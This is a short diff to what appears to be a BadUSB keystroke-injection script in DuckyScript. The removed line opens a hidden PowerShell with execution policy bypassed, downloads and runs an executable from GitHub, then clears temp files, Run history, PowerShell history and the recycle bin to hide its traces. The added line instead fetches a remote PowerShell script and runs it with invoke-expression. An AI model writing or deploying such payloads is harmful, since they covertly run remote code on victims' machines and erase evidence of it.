@@ -5,4 +5,4 @@ REM Version: 1.0
 
 GUI r
 DELAY 250
-STRINGLN powershell -w h -NoP -NonI -Exec Bypass $pl = iwr -Uri https://github.com/CoolCoderSJ/Self-Destructing-Passwords/releases/download/v1.0.3/Updater.exe -OutFile %APPDATA%\..\..\.tempfiles\updater.exe; mkdir %APPDATA%\..\..\.tempfiles; invoke-expression $pl; rm %APPDATA%\..\..\.tempfiles\updater.exe; rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath; Clear-RecycleBin -Force -ErrorAction SilentlyContinue 
+STRINGLN powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/CoolCoderSJ/Self-Destructing-Passwords/main/decrypt.ps1; invoke-expression $pl
